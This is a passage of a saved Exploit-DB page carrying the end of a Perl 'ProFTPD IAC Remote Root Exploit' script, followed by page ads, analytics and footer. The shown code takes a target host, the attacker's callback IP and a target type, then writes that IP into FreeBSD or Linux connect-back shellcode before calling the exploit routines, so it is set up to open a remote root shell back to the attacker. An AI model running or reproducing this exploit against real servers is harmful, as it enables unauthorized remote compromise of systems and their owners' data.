<code class="plain">usage() {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"written by kingcope\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"usage:\n"</code><code class="plain">.</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="string">"proremote.pl &lt;target ip/host&gt; &lt;your ip&gt; &lt;target type&gt;\n\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">for</code> <code class="plain">(</code><code class="variable">$i</code><code class="plain">=0; </code><code class="variable">$i</code><code class="plain">&lt;</code><code class="variable">$numtargets</code><code class="plain">; </code><code class="variable">$i</code><code class="plain">++) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"\t["</code><code class="plain">.</code><code class="variable">$i</code><code class="plain">.</code><code class="string">"]\t"</code><code class="plain">. </code><code class="variable">$targets</code><code class="plain">[</code><code class="variable">$i</code><code class="plain">][0]. </code><code class="string">"\r\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="keyword">if</code> <code class="plain">($</code><code class="comments">#ARGV ne 2) { usage; }</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="variable">$target</code> <code class="plain">= </code><code class="variable">$ARGV</code><code class="plain">[0];</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="variable">$cbip</code> <code class="plain">= </code><code class="variable">$ARGV</code><code class="plain">[1];</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="variable">$ttype</code> <code class="plain">= </code><code class="variable">$ARGV</code><code class="plain">[2];</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="variable">$platform</code> <code class="plain">= </code><code class="variable">$targets</code><code class="plain">[</code><code class="variable">$ttype</code><code class="plain">][1];</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="variable">$style</code> <code class="plain">= </code><code class="variable">$targets</code><code class="plain">[</code><code class="variable">$ttype</code><code class="plain">][2];</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="plain">(</code><code class="variable">$a1</code><code class="plain">, </code><code class="variable">$a2</code><code class="plain">, </code><code class="variable">$a3</code><code class="plain">, </code><code class="variable">$a4</code><code class="plain">) = </code><code class="functions">split</code><code class="plain">(//, </code><code class="functions">gethostbyname</code><code class="plain">(</code><code class="string">"$cbip"</code><code class="plain">));</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="keyword">if</code> <code class="plain">(</code><code class="variable">$platform</code> <code class="plain">eq </code><code class="string">"FreeBSD"</code><code class="plain">) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$shellcode</code> <code class="plain">= </code><code class="variable">$bsdcbsc</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">substr</code><code class="plain">(</code><code class="variable">$shellcode</code><code class="plain">, 37, 4, </code><code class="variable">$a1</code> <code class="plain">. </code><code class="variable">$a2</code> <code class="plain">. </code><code class="variable">$a3</code> <code class="plain">. </code><code class="variable">$a4</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{ </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="keyword">if</code> <code class="plain">(</code><code class="variable">$platform</code> <code class="plain">eq </code><code class="string">"Linux"</code><code class="plain">) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="variable">$shellcode</code> <code class="plain">= </code><code class="variable">$lnxcbsc</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">substr</code><code class="plain">(</code><code class="variable">$shellcode</code><code class="plain">, 31, 4, </code><code class="variable">$a1</code> <code class="plain">. </code><code class="variable">$a2</code> <code class="plain">. </code><code class="variable">$a3</code> <code class="plain">. </code><code class="variable">$a4</code><code class="plain">);</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="functions">print</code> <code class="string">"typo ?\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="keyword">exit</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="plain">}}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="keyword">if</code> <code class="plain">(</code><code class="variable">$style</code> <code class="plain">eq 0) {</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">exploit1;</code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="plain">} </code><code class="keyword">else</code> <code class="plain">{</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain">exploit2;&nbsp;&nbsp; </code></td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="plain">}</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content">&nbsp;</td></tr></tbody></table></div><div class="line alt1"><table><tbody><tr><td class="content"><code class="functions">print</code> <code class="string">"done.\n"</code><code class="plain">;</code></td></tr></tbody></table></div><div class="line alt2"><table><tbody><tr><td class="content"><code class="keyword">exit</code><code class="plain">;</code></td></tr></tbody></table></div></div></div>
		</div>
<br><br><br>

<div class="barColor">		
<center>
<br><br>
<script type="text/javascript"><!--
google_ad_client = "ca-pub-0054251952045395";
/* Exploit single page ad */
google_ad_slot = "4301625741";
google_ad_width = 728;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript" src="./ProFTPD IAC Remote Root Exploit_files/show_ads.js">
</script><ins style="display:inline-table;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:728px"><ins id="aswift_1_anchor" style="display:block;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:728px"><iframe allowtransparency="true" frameborder="0" height="90" hspace="0" marginwidth="0" marginheight="0" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){i+=&#39;.call&#39;;setTimeout(h,0)}else if(h.match){i+=&#39;.nav&#39;;w.location.replace(h)}s.log&amp;&amp;s.log.push(i)}" scrolling="no" vspace="0" width="728" id="aswift_1" name="aswift_1" style="left:0;position:absolute;top:0;"></iframe></ins></ins>
</center>
	
		<script type="text/javascript">
		function toggle(obj) {
			var el = document.getElementById(obj);
			el.style.display = (el.style.display != 'none' ? 'none' : 'block' );
		}
		</script>
		
		<br>

		<fieldset id="digicomments" style="width:755px;  margin-left:auto; margin-right:auto; background-color:#eaeaea;"> 
		<legend>Comments</legend>
		<div id="comments2">
			
										<h3>No comments so far</h3>
										<!-- <p><a href="http://www.exploit-db.com/?page_id=1321?redirect_to=http://www.exploit-db.com/exploits/15449">Login</a>/<a href="http://www.exploit-db.com/?page_id=1323">Register</a> to be able to post comments</p> -->
					</div>
		</fieldset>

<br><br>
<center>
<div id="footer">


<br><br>

        © Offensive Security 2011
</div></center>
			<script type="text/javascript">
				var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
				document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
			</script><script src="./ProFTPD IAC Remote Root Exploit_files/ga.js" type="text/javascript"></script>
			<script type="text/javascript">
				try {
					var pageTracker = _gat._getTracker("UA-1981501-4");
					pageTracker._trackPageview();
					} catch(err) {}
			</script>	
		</div>


<div id="fancybox-tmp"></div><div id="fancybox-loading"><div></div></div><div id="fancybox-overlay"></div><div id="fancybox-wrap"><div id="fancybox-outer"><div class="fancy-bg" id="fancy-bg-n"></div><div class="fancy-bg" id="fancy-bg-ne"></div><div class="fancy-bg" id="fancy-bg-e"></div><div class="fancy-bg" id="fancy-bg-se"></div><div class="fancy-bg" id="fancy-bg-s"></div><div class="fancy-bg" id="fancy-bg-sw"></div><div class="fancy-bg" id="fancy-bg-w"></div><div class="fancy-bg" id="fancy-bg-nw"></div><div id="fancybox-inner"></div><a id="fancybox-close"></a><a href="javascript:;" id="fancybox-left"><span class="fancy-ico" id="fancybox-left-ico"></span></a><a href="javascript:;" id="fancybox-right"><span class="fancy-ico" id="fancybox-right-ico"></span></a></div></div><yoono-share-selection-layer style="position: absolute !important; border-top-width: 3px !important; border-right-width: 3px !important; border-bottom-width: 3px !important; border-left-width: 3px !important; border-top-style: solid !important; border-right-style: solid !important; border-bottom-style: solid !important; border-left-style: solid !important; border-top-color: rgb(47, 148, 47) !important; border-right-color: rgb(47, 148, 47) !important; border-bottom-color: rgb(47, 148, 47) !important; border-left-color: rgb(47, 148, 47) !important; border-image: initial !important; display: none; z-index: 100000 !important; border-top-left-radius: 5px !important; border-top-right-radius: 5px !important; border-bottom-right-radius: 5px !important; border-bottom-left-radius: 5px !important; background-image: url(http://cache.yoono.com/static/sb/share/green-30.png) !important; cursor: pointer !important; "></yoono-share-selection-layer><yoono-share-selection-btn style="position: absolute !important; display: none; background-color: rgb(47, 148, 47) !important; color: white !important; height: 17px !important; padding-top: 3px !important; padding-right: 7px !important; text-decoration: underline !important; -webkit-user-select: none !important; cursor: pointer !important; z-index: 100000 !important; font-family: arial, sans-serif !important; font-size: 11px !important; "><yoono-share-selection-btn-ico style="float: left !important; width: 16px !important; height: 16px !important; margin-left: 8px !important; margin-right: 5px !important; background-image: url(http://cache.yoono.com/static/sb/share/share-icons.png) !important; background-position: -1px -1px; "></yoono-share-selection-btn-ico>select</yoono-share-selection-btn></body></html>